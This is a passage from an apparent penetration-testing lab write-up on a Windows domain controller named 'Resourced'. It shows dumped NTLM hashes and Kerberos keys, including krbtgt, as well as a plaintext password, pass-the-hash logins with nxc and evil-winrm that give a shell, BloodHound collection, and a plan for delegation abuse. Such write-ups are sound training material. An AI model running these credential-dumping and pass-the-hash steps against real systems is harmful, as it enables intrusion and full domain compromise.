+R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
+R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
+R.Robinson:des-cbc-md5:7051d568dfd0852f
+D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
+D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
+D.Durant:des-cbc-md5:376119bfcea815f8
+G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
+G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
+G.Goldberg:des-cbc-md5:3e20fd1a25687673
+[*] Cleaning up...</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
+dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
+[*] NL$KM 
+ 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.&gt;.J......I.
+ 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
+ 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
+ 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
+NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
+M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
+K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
+L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
+J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
+V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
+S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
+P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
+R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
+D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
+G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
+Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
+Administrator:des-cbc-md5:80861f1a80f1232f
+RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
+RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
+RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
+krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
+krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
+krbtgt:des-cbc-md5:f1b602194f3713f8
+M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
+M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
+M.Mason:des-cbc-md5:268501b50e0bf47c
+K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
+K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
+K.Keen:des-cbc-md5:572cce13b38ce6da
+L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
+L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
+L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
+J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
+J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
+J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
+V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
+V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
+V.Ventz:des-cbc-md5:4af77a3d1cf7c480
+S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
+S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
+S.Swanson:des-cbc-md5:5d37583eae1f2f34
+P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
+P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
+P.Parker:des-cbc-md5:083b37079dcd764f
+R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
+R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
+R.Robinson:des-cbc-md5:7051d568dfd0852f
+D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
+D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
+D.Durant:des-cbc-md5:376119bfcea815f8
+G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
+G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
+G.Goldberg:des-cbc-md5:3e20fd1a25687673
+[*] Cleaning up...</code></pre></div>
+<p>From the output above, we are interested in the following:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
+M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
+K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
+L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
+J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
+V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
+S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
+P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
+R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
+D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
+G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::</pre><pre class="hljs"><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
+M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
+K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
+L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
+J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
+V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
+S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
+P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
+R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
+D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
+G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::</code></pre></div>
+<p>When checking for privilege accounts, I notice the user account <code class="inline-code">L.Livingstone</code> has privileges to RDP and use WinRM:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc ldap 192.168.131.175 -u v.ventz -p &apos;HotelCalifornia194!&apos; --groups &quot;Remote Management Users&quot;
+LDAP        192.168.131.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
+LDAP        192.168.131.175 389    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194! 
+LDAP        192.168.131.175 389    RESOURCEDC       L.Livingstone
+                                                                                                                                                                                                 
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc ldap 192.168.131.175 -u v.ventz -p &apos;HotelCalifornia194!&apos; --groups &quot;Remote Desktop Users&quot;   
+LDAP        192.168.131.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
+LDAP        192.168.131.175 389    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194! 
+LDAP        192.168.131.175 389    RESOURCEDC       L.Livingstone
+LDAP        192.168.131.175 389    RESOURCEDC       Administrator</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc ldap 192.168.131.175 -u v.ventz -p &apos;HotelCalifornia194!&apos; --groups &quot;Remote Management Users&quot;
+LDAP        192.168.131.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
+LDAP        192.168.131.175 389    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194! 
+LDAP        192.168.131.175 389    RESOURCEDC       L.Livingstone
+                                                                                                                                                                                                 
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc ldap 192.168.131.175 -u v.ventz -p &apos;HotelCalifornia194!&apos; --groups &quot;Remote Desktop Users&quot;   
+LDAP        192.168.131.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
+LDAP        192.168.131.175 389    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194! 
+LDAP        192.168.131.175 389    RESOURCEDC       L.Livingstone
+LDAP        192.168.131.175 389    RESOURCEDC       Administrator</code></pre></div>
+<p>When checking the obtained password hash of <code class="inline-code">l.livingstone</code> against the domain, it seems to work:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc smb 192.168.131.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
+SMB         192.168.131.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
+SMB         192.168.131.175 445    RESOURCEDC       [+] resourced.local\l.livingstone:19a3a7550ce8c505c2d46b5e39d6f808</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc smb <span class="hljs-number">192.168.131.175</span> -u l.livingstone -H <span class="hljs-number">19</span>a3a7550ce8c505c2d46b5e<span class="hljs-number">39d6f808</span>
+SMB         <span class="hljs-number">192.168.131.175</span> <span class="hljs-number">445</span>    RESOURCEDC       [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
+SMB         <span class="hljs-number">192.168.131.175</span> <span class="hljs-number">445</span>    RESOURCEDC       [+] resourced.local\l.livingstone:<span class="hljs-number">19</span>a3a7550ce8c505c2d46b5e<span class="hljs-number">39d6f808</span></code></pre></div>
+<p>I notice it is not possible to RDP into the DC by performing pass-the-hash. However, I can access the DC via WinRM:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc winrm 192.168.131.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808                 
+WINRM       192.168.131.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.131.175 5985   RESOURCEDC       [+] resourced.local\l.livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
+WINRM       192.168.131.175 5985   RESOURCEDC       [-] resourced.local\l.livingstone:19a3a7550ce8c505c2d46b5e39d6f808 zip() argument 2 is longer than argument 1
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Resourced]</span>
+&boxur;&boxh;$ nxc winrm <span class="hljs-number">192.168</span>.<span class="hljs-number">131.175</span> -u l<span class="hljs-selector-class">.livingstone</span> -H <span class="hljs-number">19</span>a3a7550ce8c505c2d46b5e39d6f808                 
+WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">131.175</span> <span class="hljs-number">5985</span>   RESOURCEDC       <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (name:RESOURCEDC) (domain:resourced.local)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto<span class="hljs-selector-class">.py</span>:<span class="hljs-number">46</span>: CryptographyDeprecationWarning: ARC4 has been moved to cryptography<span class="hljs-selector-class">.hazmat</span><span class="hljs-selector-class">.decrepit</span><span class="hljs-selector-class">.ciphers</span><span class="hljs-selector-class">.algorithms</span><span class="hljs-selector-class">.ARC4</span> and will be removed from cryptography<span class="hljs-selector-class">.hazmat</span><span class="hljs-selector-class">.primitives</span><span class="hljs-selector-class">.ciphers</span><span class="hljs-selector-class">.algorithms</span> <span class="hljs-keyword">in</span> <span class="hljs-number">48.0</span>.<span class="hljs-number">0</span>.
+  arc4 = algorithms<span class="hljs-selector-class">.ARC4</span>(self._key)
+WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">131.175</span> <span class="hljs-number">5985</span>   RESOURCEDC       <span class="hljs-selector-attr">[+]</span> resourced.local\l<span class="hljs-selector-class">.livingstone</span>:<span class="hljs-number">19</span>a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
+WINRM       <span class="hljs-number">192.168</span>.<span class="hljs-number">131.175</span> <span class="hljs-number">5985</span>   RESOURCEDC       <span class="hljs-selector-attr">[-]</span> resourced.local\l<span class="hljs-selector-class">.livingstone</span>:<span class="hljs-number">19</span>a3a7550ce8c505c2d46b5e39d6f808 <span class="hljs-built_in">zip</span>() argument <span class="hljs-number">2</span> is longer than argument <span class="hljs-number">1</span>
+</code></pre></div>
+<p>And now I have a shell on the DC:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ evil-winrm -u l.livingstone -i RESOURCEDC -H 19a3a7550ce8c505c2d46b5e39d6f808 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 192.168.131.175
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.131.254
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; 
+
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ evil-winrm -u l.livingstone -i RESOURCEDC -H <span class="hljs-number">19</span>a3a7550ce8c505c2d46b5e39d6f808 
+                                        
+Evil-WinRM shell v3.<span class="hljs-number">9</span>
+                                        
+Warning: Remote path completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: undefined <span class="hljs-keyword">method</span> `<span class="hljs-title function_">quoting_detection_proc</span>&apos; <span class="hljs-title function_">for</span> <span class="hljs-title function_">module</span> <span class="hljs-title function_">Reline</span>
+                                        
+<span class="hljs-title function_">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span>
+                                        
+Info: Establishing connection <span class="hljs-keyword">to</span> remote endpoint
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 <span class="hljs-number">2</span>:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">131.175</span>
+   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span>
+   <span class="hljs-keyword">Default</span> Gateway . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">131.254</span>
+*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; 
+
+</code></pre></div>
+<p>After manual enumeration, I didn&apos;t find anything on the machine.</p>
+<p>In a separate terminal, collect domain data:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ bloodhound-python -d resourced.local -u l.livingstone --hashes :19a3a7550ce8c505c2d46b5e39d6f808 -c all -ns 192.168.131.175
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: resourced.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (resourcedc.resourced.local:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: resourcedc.resourced.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: resourcedc.resourced.local
+INFO: Found 14 users
+INFO: Found 52 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: ResourceDC.resourced.local
+INFO: Done in 00M 02S</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ bloodhound-python -d resourced.local -u l.livingstone --hashes :<span class="hljs-number">19</span>a3a7550ce8c505c2d46b5e39d6f808 -c all -ns <span class="hljs-number">192.168</span>.<span class="hljs-number">131.175</span>
+<span class="hljs-symbol">INFO:</span> BloodHound.py <span class="hljs-keyword">for</span> BloodHound LEGACY (BloodHound <span class="hljs-number">4.2</span> <span class="hljs-built_in">and</span> <span class="hljs-number">4.3</span>)
+<span class="hljs-symbol">INFO:</span> Found AD domain: resourced.local
+<span class="hljs-symbol">INFO:</span> Getting TGT <span class="hljs-keyword">for</span> user
+<span class="hljs-symbol">WARNING:</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> Kerberos TGT. Falling back <span class="hljs-keyword">to</span> NTLM authentication. <span class="hljs-keyword">Error</span>: [Errno Connection <span class="hljs-keyword">error</span> (resourcedc.resourced.local:<span class="hljs-number">88</span>)] [Errno -<span class="hljs-number">2</span>] Name <span class="hljs-built_in">or</span> service <span class="hljs-built_in">not</span> known
+<span class="hljs-symbol">INFO:</span> Connecting <span class="hljs-keyword">to</span> LDAP server: resourcedc.resourced.local
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> domains
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> domains <span class="hljs-keyword">in</span> the forest
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> computers
+<span class="hljs-symbol">INFO:</span> Connecting <span class="hljs-keyword">to</span> LDAP server: resourcedc.resourced.local
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">14</span> users
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">52</span> groups
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">2</span> gpos
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> ous
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">19</span> containers
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">0</span> trusts
+<span class="hljs-symbol">INFO:</span> Starting computer enumeration <span class="hljs-keyword">with</span> <span class="hljs-number">10</span> workers
+<span class="hljs-symbol">INFO:</span> Querying computer: ResourceDC.resourced.local
+<span class="hljs-symbol">INFO:</span> Done <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>M <span class="hljs-number">02S</span></code></pre></div>
+<p>And game over as we have GenericAll privileges over the domain controller, so we can perform RBCD:<br/>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABPkAAAD7CAIAAACXPNZOAAAAAXNSR0IArs4c6QAAIABJREFUeJzs3Xd4VGWiP/Dve6ZlZlImPQGSEAKElhACIXRUBFFERMCOAnbXdde79+cWvV7vXb27q7vqrmunqKggvUiR3nsvCSmQQnovM5l+zu+PCUkIEASCyPD9PDw8kzPvOec9ZyBzvue8RSiKAiIiIiIiIiIvIt3oChARERERERG1M2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI2zDrEhERERERkbdh1iUiIiIiIiJvw6xLRERERERE3oZZl4iIiIiIiLwNsy4RERERERF5G2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI2zDrEhERERERkbdh1iUiIiIiIiJvw6xLRERERERE3oZZl4iIiIiIiLwNsy4RERERERF5G2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI2zDrEhERERERkbdh1iUiIiIiIiJvw6xLRERERERE3oZZl4iIiIiIiLwNsy4RERERERF5G2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI2zDrEhERERERkbdh1iUiIiIiIiJvw6xLRERERERE3oZZl4iIiIiIiLwNsy4RERERERF5G2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI2zDrEhERERERkbdh1iUiIiIiIiJvw6xLRERERERE3oZZl4iIiIiIiLwNsy4RERERERF5G2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI2zDrEhERERERkbdh1iUiIiIiIiJvw6xLRERERERE3oZZl4iIiIiIiLwNsy4RERERERF5G2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI2zDrEhERERERkbdh1iUiIiIiIiJvw6xLRERERERE3oZZl4iIiIiIiLwNsy4RERERERF5G2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI2zDrEhERERERkbdh1iUiIiIiIiJvw6xLRERERERE3oZZl4iIiIiIiLwNsy4RERERERF5G2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI2zDrEhERERERkbdh1iUiIiIiIiJvw6xLRERERERE3oZZl4iIiIiIiLwNsy4RERERERF5G2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI2zDrEhERERERkbdh1iUiIiIiIiJvw6xLRERERERE3oZZl4iIiIiIiLwNsy4RERERERF5G2ZdIiIiIiIi8jbMukRERERERORtmHWJiIiIiIjI26hvdAW8lsOJ0nJYGmC3w2qH3QGXEzoddFr46KDXwxSAkMAbXUsiIiKiW4nb7a6pqbFYLE6nU5ZljUaj1+v9/f31ev2NrhoRtTNm3XbTYEXuWeQXoqQMpRWorEJNHWw2OJxwOuF0w+2CRgOtBmo1dDoYDQgKQGgIIkIRGY6YTojqcKOPgYiIiMgbud3uvLy8wsLC4uLiwsLCyspKi8WiKIqPj4/JZIqMjOzYsWNkZGR0dLSfn9+NriwRtQ9m3WtSWY28AuSeRV4BCopQWoHySlTXoqYWlobLr65SIcAPpgAEmRAeig7hiOqAmCjERqFTB+i0P8chEBEREXm3jIyMU6dO7d279+jRo4WFhWaz2WazOZ1OACqVSqfTGY3GoKCghISEAQMGJCQk9OzZ02g03uhaE9G1Eoqi3Og63JQKS3D4OLbvRc5ZlFWgtBx19S3eVqxQLFBsgF3AoShuobgBKEIAKgENJK2i+EDoIfk19ZpWqxAajLBQhIegfyIGJiOhB/Q+N+oQiYiIiH5uiqLU19c3NFjtdpvNZnc6nW63W5EVAEISarVKq9X56HQ+eh+j0WgwGNreWmVl5ZEjR9auXbt58+bS0tKKigqbzXbRkpIkBQcHh4WFpaSkjBkzJjU1tUuXLtfnEInoZ8Kse2UUBUdPYvs+nEjH6Tzk5MNmP/eeXAmlWsi1UGq